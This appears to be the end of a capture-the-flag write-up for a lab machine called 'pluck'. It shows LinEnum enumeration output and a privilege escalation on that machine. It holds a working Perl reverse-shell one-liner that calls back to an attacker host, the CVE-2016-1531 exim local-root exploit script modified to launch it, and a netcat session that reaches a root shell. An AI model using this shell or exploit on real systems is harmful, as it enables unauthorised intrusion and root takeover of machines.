root       263  0.0  0.0      0     0 ?        S<   01:22   0:00 [scsi_tmf_18]
root       264  0.0  0.0      0     0 ?        S    01:22   0:00 [scsi_eh_19]
root       265  0.0  0.0      0     0 ?        S<   01:22   0:00 [scsi_tmf_19]
root       266  0.0  0.0      0     0 ?        S    01:22   0:00 [scsi_eh_20]
root       267  0.0  0.0      0     0 ?        S<   01:22   0:00 [scsi_tmf_20]
root       268  0.0  0.0      0     0 ?        S    01:22   0:00 [scsi_eh_21]
root       269  0.0  0.0      0     0 ?        S<   01:22   0:00 [scsi_tmf_21]
root       270  0.0  0.0      0     0 ?        S    01:22   0:00 [scsi_eh_22]
root       271  0.0  0.0      0     0 ?        S<   01:22   0:00 [scsi_tmf_22]
root       272  0.0  0.0      0     0 ?        S    01:22   0:00 [scsi_eh_23]
root       273  0.0  0.0      0     0 ?        S<   01:22   0:00 [scsi_tmf_23]
root       274  0.0  0.0      0     0 ?        S    01:22   0:00 [scsi_eh_24]
root       275  0.0  0.0      0     0 ?        S<   01:22   0:00 [scsi_tmf_24]
root       276  0.0  0.0      0     0 ?        S    01:22   0:00 [scsi_eh_25]
root       277  0.0  0.0      0     0 ?        S<   01:22   0:00 [scsi_tmf_25]
root       278  0.0  0.0      0     0 ?        S    01:22   0:00 [scsi_eh_26]
root       279  0.0  0.0      0     0 ?        S<   01:22   0:00 [scsi_tmf_26]
root       280  0.0  0.0      0     0 ?        S    01:22   0:00 [scsi_eh_27]
root       281  0.0  0.0      0     0 ?        S<   01:22   0:00 [scsi_tmf_27]
root       282  0.0  0.0      0     0 ?        S    01:22   0:00 [scsi_eh_28]
root       283  0.0  0.0      0     0 ?        S<   01:22   0:00 [scsi_tmf_28]
root       284  0.0  0.0      0     0 ?        S    01:22   0:00 [scsi_eh_29]
root       285  0.0  0.0      0     0 ?        S<   01:22   0:00 [scsi_tmf_29]
root       286  0.0  0.0      0     0 ?        S    01:22   0:00 [scsi_eh_30]
root       287  0.0  0.0      0     0 ?        S<   01:22   0:00 [scsi_tmf_30]
root       288  0.0  0.0      0     0 ?        S    01:22   0:00 [scsi_eh_31]
root       289  0.0  0.0      0     0 ?        S<   01:22   0:00 [scsi_tmf_31]
root       318  0.0  0.0      0     0 ?        S<   01:22   0:00 [bioset]
root       387  0.0  0.0      0     0 ?        S<   01:22   0:00 [bioset]
root       411  0.0  0.0      0     0 ?        S    01:22   0:00 [jbd2/sda1-8]
root       412  0.0  0.0      0     0 ?        S<   01:22   0:00 [ext4-rsv-conver]
root       457  0.0  0.7  53460  3528 ?        Ss   01:22   0:00 /lib/systemd/systemd-journald
root       467  0.0  0.0      0     0 ?        S    01:22   0:00 [kauditd]
root       473  0.0  0.0      0     0 ?        S<   01:22   0:00 [iscsi_eh]
root       479  0.0  0.2  94844  1228 ?        Ss   01:22   0:00 /sbin/lvmetad -f
root       484  0.0  0.0      0     0 ?        S<   01:22   0:00 [kworker/u3:0]
root       486  0.0  0.7  45060  3756 ?        Ss   01:22   0:00 /lib/systemd/systemd-udevd
root       488  0.0  0.0      0     0 ?        S<   01:22   0:00 [ib-comp-wq]
root       490  0.0  0.0      0     0 ?        S<   01:22   0:00 [ib_addr]
root       494  0.0  0.0      0     0 ?        S<   01:22   0:00 [ib_mcast]
root       495  0.0  0.0      0     0 ?        S<   01:22   0:00 [ib_nl_sa_wq]
root       498  0.0  0.0      0     0 ?        S<   01:22   0:00 [ib_cm]
root       501  0.0  0.0      0     0 ?        S<   01:22   0:00 [iw_cm_wq]
root       504  0.0  0.0      0     0 ?        S<   01:22   0:00 [rdma_cm]
root       532  0.0  0.0      0     0 ?        S    01:22   0:00 [kworker/0:4]
systemd+   558  0.0  0.5 125512  2956 ?        Ssl  01:22   0:00 /lib/systemd/systemd-timesyncd
root       570  0.0  0.0      0     0 ?        S<   01:22   0:00 [nfit]
root       650  0.0  0.2   4388  1372 ?        Ss   01:22   0:00 /usr/sbin/acpid
daemon     652  0.0  0.4  28136  2060 ?        Ss   01:22   0:00 /usr/sbin/atd -f
syslog     654  0.0  0.7 265632  3820 ?        Ssl  01:22   0:00 /usr/sbin/rsyslogd -n
root       657  0.0  0.3 161136  1808 ?        Ssl  01:22   0:00 /usr/bin/lxcfs /var/lib/lxcfs/
message+   658  0.0  0.7  43124  3612 ?        Ss   01:22   0:00 /usr/bin/dbus-daemon --system --address=systemd: --nofork --nopidfile --systemd-activation
root       666  0.0  0.8 281500  4312 ?        Ssl  01:22   0:00 /usr/lib/accountsservice/accounts-daemon
root       667  0.0  0.6  44336  3352 ?        Ss   01:22   0:00 /lib/systemd/systemd-logind
root       668  0.0  0.5  29824  2732 ?        Ss   01:22   0:00 /usr/sbin/cron -f
root       686  0.0  0.8 284180  4088 ?        Ssl  01:22   0:00 /usr/lib/policykit-1/polkitd --no-debug
root       865  0.0  0.4  16108  2348 ?        Ss   01:22   0:00 /sbin/dhclient -1 -v -pf /run/dhclient.eth0.pid -lf /var/lib/dhcp/dhclient.eth0.leases -I -df /var/lib/dhcp/dhclient6.eth0.leases eth0
systemd+  1042  0.0  0.7  47556  3964 ?        Ss   01:22   0:00 /lib/systemd/systemd-resolved
root      1044  0.0  0.9  67824  4732 ?        Ss   01:22   0:00 /usr/sbin/sshd -D
root      1066  0.0  0.0   5216   120 ?        Ss   01:22   0:00 /sbin/iscsid
root      1067  0.0  0.7   5716  3508 ?        S<Ls 01:22   0:01 /sbin/iscsid
root      1095  0.0  0.3  14784  1804 tty1     Ss+  01:22   0:00 /sbin/agetty --noclear tty1 linux
mysql     1115  0.0 23.0 1113068 115368 ?      Ssl  01:22   0:02 /usr/sbin/mysqld
root      1152  0.0  0.3  15044  1860 ?        Ss   01:22   0:00 /usr/sbin/xinetd -pidfile /run/xinetd.pid -stayalive -inetd_compat -inetd_ipv6
root      1168  0.0  3.1 262776 15720 ?        Ss   01:22   0:00 /usr/sbin/apache2 -k start
www-data  1172  0.0  1.3 263240  6552 ?        S    01:22   0:00 /usr/sbin/apache2 -k start
www-data  1174  0.0  1.4 263248  7192 ?        S    01:22   0:01 /usr/sbin/apache2 -k start
www-data  1176  0.0  1.2 263232  6460 ?        S    01:22   0:00 /usr/sbin/apache2 -k start
www-data  1289  0.0  1.2 263232  6384 ?        S    01:26   0:00 /usr/sbin/apache2 -k start
www-data  1290  0.0  1.2 263232  6436 ?        S    01:26   0:00 /usr/sbin/apache2 -k start
www-data  1291  0.1  2.6 267524 13076 ?        S    01:26   0:10 /usr/sbin/apache2 -k start
www-data  1292  0.1  1.7 263912  8576 ?        S    01:26   0:10 /usr/sbin/apache2 -k start
www-data  1293  0.0  1.5 263388  7544 ?        S    01:26   0:07 /usr/sbin/apache2 -k start
www-data  1294  0.1  2.0 263420 10144 ?        S    01:26   0:07 /usr/sbin/apache2 -k start
paul      1527  0.0  0.5  62764  2880 ?        Ss   02:29   0:00 /lib/systemd/systemd --user
paul      1528  0.0  0.3  84792  1592 ?        S    02:29   0:00 (sd-pam)
root      1703  0.0  0.0      0     0 ?        S    02:51   0:00 [kworker/u2:2]
paul      1705  0.0  0.1   4496   788 ?        S    02:54   0:00 sh -c vim test.txt
paul      1706  0.1  1.3  53700  6872 ?        S    02:54   0:03 vim test.txt
paul      1710 38.6  0.5  17148  2732 ?        R    02:55  13:13 /usr/bin/pdmenu
root      1823  0.0  1.1 101812  5888 ?        Ss   03:16   0:00 sshd: paul [priv]
paul      1827  0.0  0.7 101812  3728 ?        S    03:16   0:00 sshd: paul@pts/1
paul      1828  0.0  0.5  17148  2916 pts/1    Ss   03:16   0:00 -pdmenu
root      8514  0.0  0.0      0     0 ?        S    03:18   0:00 [kworker/0:0]
root      8524  0.0  0.0      0     0 ?        S    03:20   0:00 [kworker/u2:1]
paul      8525  0.0  0.1   4496   756 pts/1    S    03:20   0:00 sh -c vim test.tt && sh shell.pl
paul      8527  0.0  0.1   4496   700 pts/1    S    03:20   0:00 sh shell.pl
paul      8528  0.0  0.3   4496  1620 pts/1    S    03:20   0:00 /bin/sh -i
root     15195  0.0  1.1 101812  5872 ?        Ss   03:23   0:00 sshd: paul [priv]
paul     15199  0.0  0.7 101812  3812 ?        S    03:23   0:00 sshd: paul@pts/2
paul     15200  0.0  0.6  17148  3204 pts/2    Ss+  03:23   0:00 -pdmenu
root     18351  0.0  0.0      0     0 ?        S    03:27   0:00 [kworker/u2:0]
paul     18357  0.2  0.5  11316  2988 pts/1    S+   03:29   0:00 /bin/bash ./LinEnum.sh
paul     18664  0.0  0.3  11292  1808 pts/1    S+   03:29   0:00 /bin/bash ./LinEnum.sh
paul     18665  0.0  0.6  36328  3412 pts/1    R+   03:29   0:00 ps aux


Contents of /etc/xinetd.conf:
# Simple configuration file for xinetd
#
# Some defaults, and include /etc/xinetd.d/

defaults
{

# Please note that you need a log_type line to be able to use log_on_success
# and log_on_failure. The default is the following :
# log_type = SYSLOG daemon info

}

includedir /etc/xinetd.d


/etc/xinetd.d is included in /etc/xinetd.conf - associated binary permissions are listed below: ls -la /etc/xinetd.d


/etc/init.d/ binary permissions:
total 216
drwxr-xr-x  2 root root 4096 Jan 19 12:54 .
drwxr-xr-x 98 root root 4096 Jan 19 20:02 ..
-rwxr-xr-x  1 root root 2243 Feb 10  2016 acpid
-rwxr-xr-x  1 root root 8087 Apr  5  2016 apache2
-rwxr-xr-x  1 root root 2210 Apr  5  2016 apache-htcacheclean
-rwxr-xr-x  1 root root 6511 Sep 29  2016 apparmor
-rwxr-xr-x  1 root root 2799 Jul 28  2016 apport
-rwxr-xr-x  1 root root 1071 Dec  6  2015 atd
-rwxr-xr-x  1 root root 2080 Sep 26  2016 console-setup.sh
-rwxr-xr-x  1 root root 3049 Apr  5  2016 cron
-rwxr-xr-x  1 root root  937 Apr 29  2016 cryptdisks
-rwxr-xr-x  1 root root  896 Apr 29  2016 cryptdisks-early
-rwxr-xr-x  1 root root 2813 Aug 15  2016 dbus
-rwxr-xr-x  1 root root 4352 Mar 15  2013 ebtables
-rwxr-xr-x  1 root root 6685 Aug 17  2016 exim4
-rwxr-xr-x  1 root root  985 May 20  2016 grub-common
-rwxr-xr-x  1 root root 3809 Sep  9  2016 hwclock.sh
-rwxr-xr-x  1 root root 2372 Apr 11  2016 irqbalance
-rwxr-xr-x  1 root root 1503 Mar 29  2016 iscsid
-rwxr-xr-x  1 root root 2038 Sep 26  2016 keyboard-setup.sh
-rwxr-xr-x  1 root root 2087 Apr  5  2016 kmod
-rwxr-xr-x  1 root root  695 Jul 10  2016 lvm2
-rwxr-xr-x  1 root root  571 Jul 10  2016 lvm2-lvmetad
-rwxr-xr-x  1 root root  586 Jul 10  2016 lvm2-lvmpolld
-rwxr-xr-x  1 root root 2300 Oct  5  2016 lxcfs
-rwxr-xr-x  1 root root 2240 Oct  5  2016 lxd
-rwxr-xr-x  1 root root 2653 Jul 26  2016 mdadm
-rwxr-xr-x  1 root root 1249 Jul 26  2016 mdadm-waitidle
-rwxr-xr-x  1 root root 5607 Sep 16  2016 mysql
-rwxr-xr-x  1 root root 4771 Jul 19  2015 networking
-rwxr-xr-x  1 root root 2503 Mar 29  2016 open-iscsi
-rwxr-xr-x  1 root root 1578 Sep 18  2016 open-vm-tools
-rwxr-xr-x  1 root root 1366 Nov 15  2015 plymouth
-rwxr-xr-x  1 root root  752 Nov 15  2015 plymouth-log
-rwxr-xr-x  1 root root 1191 Jul 10  2016 procps
-rwxr-xr-x  1 root root 4149 Jun  8  2016 resolvconf
-rwxr-xr-x  1 root root 4355 Jul 10  2014 rsync
-rwxr-xr-x  1 root root 2796 Feb  3  2016 rsyslog
-rwxr-xr-x  1 root root 1226 Jun 21  2016 screen-cleanup
-rwxr-xr-x  1 root root 4077 Aug  7  2016 ssh
-rwxr-xr-x  1 root root 6087 Oct  2  2016 udev
-rwxr-xr-x  1 root root 2049 Aug  7  2014 ufw
-rwxr-xr-x  1 root root 1379 Apr 29  2016 unattended-upgrades
-rwxr-xr-x  1 root root 1306 Sep 12  2016 uuidd
-rwxr-xr-x  1 root root 2443 Oct 26  2013 xinetd


### SOFTWARE #############################################
Sudo version:
Sudo version 1.8.16


MYSQL version:
mysql  Ver 14.14 Distrib 5.7.16, for Linux (x86_64) using  EditLine wrapper


Apache version:
Server version: Apache/2.4.18 (Ubuntu)
Server built:   2016-07-18T18:32:02


Apache user configuration:
APACHE_RUN_USER=www-data
APACHE_RUN_GROUP=www-data


Installed Apache modules:
Loaded Modules:
 core_module (static)
 so_module (static)
 watchdog_module (static)
 http_module (static)
 log_config_module (static)
 logio_module (static)
 version_module (static)
 unixd_module (static)
 access_compat_module (shared)
 alias_module (shared)
 auth_basic_module (shared)
 authn_core_module (shared)
 authn_file_module (shared)
 authz_core_module (shared)
 authz_host_module (shared)
 authz_user_module (shared)
 autoindex_module (shared)
 deflate_module (shared)
 dir_module (shared)
 env_module (shared)
 filter_module (shared)
 mime_module (shared)
 mpm_prefork_module (shared)
 negotiation_module (shared)
 php7_module (shared)
 setenvif_module (shared)
 status_module (shared)


Anything in the Apache home dirs?:
/var/www/:
total 12K
drwxr-xr-x  3 root root 4.0K Jan 18 07:25 .
drwxr-xr-x 13 root root 4.0K Jan 18 11:07 ..
drwxr-xr-x  6 root root 4.0K Jan 19 08:24 html

/var/www/html:
total 64K
drwxr-xr-x 6 root root 4.0K Jan 19 08:24 .
drwxr-xr-x 3 root root 4.0K Jan 18 07:25 ..
-rw-r--r-- 1 root root  17K Jan 19 06:43 about.php
-rw-r--r-- 1 root root 1.5K Jan 19 07:51 admin.php
-rw-r--r-- 1 root root 1.1K Jan 19 08:24 contact.php
drwxr-xr-x 2 root root 4.0K Jul 25  2016 css
drwxr-xr-x 2 root root 4.0K Jul 25  2016 fonts
-rw-r--r-- 1 root root  241 Jan 18 17:10 footer.php
-rw-r--r-- 1 root root 1.6K Jan 19 07:53 header.php
drwxr-xr-x 2 root root 4.0K Jan 19 06:12 images
-rw-r--r-- 1 root root  735 Jan 19 08:22 index.php
drwxr-xr-x 2 root root 4.0K Jan 18 17:08 js

/var/www/html/css:
total 1.3M
drwxr-xr-x 2 root root 4.0K Jul 25  2016 .
drwxr-xr-x 6 root root 4.0K Jan 19 08:24 ..
-rw-r--r-- 1 root root 143K Jul 25  2016 bootstrap.css
-rw-r--r-- 1 root root 381K Jul 25  2016 bootstrap.css.map
-rw-r--r-- 1 root root 119K Jul 25  2016 bootstrap.min.css
-rw-r--r-- 1 root root 530K Jul 25  2016 bootstrap.min.css.map
-rw-r--r-- 1 root root  26K Jul 25  2016 bootstrap-theme.css
-rw-r--r-- 1 root root  47K Jul 25  2016 bootstrap-theme.css.map
-rw-r--r-- 1 root root  23K Jul 25  2016 bootstrap-theme.min.css
-rw-r--r-- 1 root root  26K Jul 25  2016 bootstrap-theme.min.css.map

/var/www/html/fonts:
total 228K
drwxr-xr-x 2 root root 4.0K Jul 25  2016 .
drwxr-xr-x 6 root root 4.0K Jan 19 08:24 ..
-rw-r--r-- 1 root root  20K Jul 25  2016 glyphicons-halflings-regular.eot
-rw-r--r-- 1 root root 107K Jul 25  2016 glyphicons-halflings-regular.svg
-rw-r--r-- 1 root root  45K Jul 25  2016 glyphicons-halflings-regular.ttf
-rw-r--r-- 1 root root  23K Jul 25  2016 glyphicons-halflings-regular.woff
-rw-r--r-- 1 root root  18K Jul 25  2016 glyphicons-halflings-regular.woff2

/var/www/html/images:
total 76K
drwxr-xr-x 2 root root 4.0K Jan 19 06:12 .
drwxr-xr-x 6 root root 4.0K Jan 19 08:24 ..
-rw-r--r-- 1 bob  bob   67K Jan 19 06:11 rubber-duck.jpg

/var/www/html/js:
total 220K
drwxr-xr-x 2 root root 4.0K Jan 18 17:08 .
drwxr-xr-x 6 root root 4.0K Jan 19 08:24 ..
-rw-r--r-- 1 root root  69K Jul 25  2016 bootstrap.js
-rw-r--r-- 1 root root  37K Jul 25  2016 bootstrap.min.js
-rw-r--r-- 1 root root  95K Dec 20 20:17 jquery.min.js
-rw-r--r-- 1 root root  484 Jul 25  2016 npm.js


### INTERESTING FILES ####################################
Useful file locations:
/bin/nc
/bin/netcat
/usr/bin/wget
/usr/bin/gcc


Installed compilers:
ii  gcc                                        4:6.1.1-1ubuntu2                        amd64        GNU C compiler
ii  gcc-6                                      6.2.0-5ubuntu12                         amd64        GNU C compiler


Can we read/write sensitive files:
-rw-r--r-- 1 root root 1901 Jan 19 19:47 /etc/passwd
-rw-r--r-- 1 root root 859 Jan 18 10:07 /etc/group
-rw-r--r-- 1 root root 581 Apr 22  2016 /etc/profile
-rw-r----- 1 root shadow 1409 Jan 19 08:27 /etc/shadow


Can't search *.conf files as no keyword was entered

Can't search *.log files as no keyword was entered

Can't search *.ini files as no keyword was entered

All *.conf files in /etc (recursive 1 level):
-rw-r--r-- 1 root root 338 Nov 18  2014 /etc/updatedb.conf
-rw-r--r-- 1 root root 34 Jan 27  2016 /etc/ld.so.conf
-rw-r--r-- 1 root root 350 Jan 18 07:26 /etc/popularity-contest.conf
-rw-r--r-- 1 root root 4781 Sep  5  2016 /etc/hdparm.conf
-rw-r--r-- 1 root root 2683 Jul 10  2016 /etc/sysctl.conf
-rw-r--r-- 1 root root 1260 Mar 16  2016 /etc/ucf.conf
-rw-r--r-- 1 root root 2584 Aug  2  2016 /etc/gai.conf
-rw-r--r-- 1 root root 1359 Sep  8  2016 /etc/rsyslog.conf
-rw-r--r-- 1 root root 280 Jun 20  2014 /etc/fuse.conf
-rw-r--r-- 1 root root 100 Jun 29  2016 /etc/sos.conf
-rw-r--r-- 1 root root 973 Sep  5  2016 /etc/mke2fs.conf
-rw-r--r-- 1 root root 6816 Oct  5  2016 /etc/overlayroot.conf
-rw-r--r-- 1 root root 703 May  6  2015 /etc/logrotate.conf
-rw-r--r-- 1 root root 289 Oct 26  2013 /etc/xinetd.conf
-rw-r--r-- 1 root root 14867 Apr 12  2016 /etc/ltrace.conf
-rw-r--r-- 1 root root 7788 Jan 18 07:26 /etc/ca-certificates.conf
-rw-r--r-- 1 root root 552 Mar 16  2016 /etc/pam.conf
-rw-r--r-- 1 root root 191 Sep  6  2016 /etc/libaudit.conf
-rw-r--r-- 1 root root 92 Oct 22  2015 /etc/host.conf
-rw-r--r-- 1 root root 3028 Oct 12  2016 /etc/adduser.conf
-rw-r--r-- 1 root root 2969 Apr 27  2016 /etc/debconf.conf
-rw-r--r-- 1 root root 144 Jan 18 07:39 /etc/kernel-img.conf
-rw-r--r-- 1 root root 604 Jul  2  2015 /etc/deluser.conf
-rw-r--r-- 1 root root 523 Jan 18 07:26 /etc/nsswitch.conf


Current user's history files:
-rw------- 1 paul paul 1 Jan 20 08:57 /home/paul/.bash_history


Any interesting mail in /var/mail:
total 8
drwxrwsr-x  2 root mail 4096 Oct 12  2016 .
drwxr-xr-x 13 root root 4096 Jan 18 11:07 ..


### SCAN COMPLETE ####################################

__

/usr/exim/bin/exim-4.84-7

A quick google search brings up an exploit for that.  The exploit just hangs in my shell, this is a reverse shell and they are always somewhat problematic.  I have an idea, I can modify the exploit code to run another reverse perl shell.

root@kali:~/pluck# searchsploit exim
/usr/share/exploitdb/platforms/linux/local/39535.sh 

$ cat shell2.pl
perl -e 'use Socket;$i="192.168.118.186";$p=8080;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
$
$ cat test.sh
#!/bin/sh
# CVE-2016-1531 exim <= 4.84-3 local root exploit
# ===============================================
# you can write files as root or force a perl module to
# load by manipulating the perl environment and running
# exim with the "perl_startup" arguement -ps.
#
# e.g.
# [fantastic@localhost tmp]$ ./cve-2016-1531.sh
# [ CVE-2016-1531 local root exploit
# sh-4.3# id
# uid=0(root) gid=1000(fantastic) groups=1000(fantastic)
#
# -- Hacker Fantastic
echo [ CVE-2016-1531 local root exploit
cat > /tmp/root.pm << EOF
package root;
use strict;
use warnings;

system("/bin/sh /home/paul/shell2.pl");
EOF
PERL5LIB=/tmp PERL5OPT=-Mroot /usr/exim/bin/exim -ps
$

Now...in my reverse shell trying to spawn a reverse root shell.

oot@kali:~/pluck# nc -lvp 8080
listening on [any] 8080 ...

192.168.118.189: inverse host lookup failed: Unknown host
connect to [192.168.118.186] from (UNKNOWN) [192.168.118.189] 55384
# #
# whoami
root

There we go :)

# cd /root
# ls
flag.txt
# cat flag.txt

Congratulations you found the flag

---------------------------------------

######   ((((((((((((((((((((((((((((((
#########   (((((((((((((((((((((((((((
,,##########   ((((((((((((((((((((((((
@@,,,##########   (((((((((((((((((((((
@@@@@,,,##########                     
@@@@@@@@,,,############################
@@@@@@@@@@@,,,#########################
@@@@@@@@@,,,###########################
@@@@@@,,,##########                    
@@@,,,##########   &&&&&&&&&&&&&&&&&&&&
,,,##########   &&&&&&&&&&&&&&&&&&&&&&&
##########   &&&&&&&&&&&&&&&&&&&&&&&&&&
#######   &&&&&&&&&&&&&&&&&&&&&&&&&&&&&
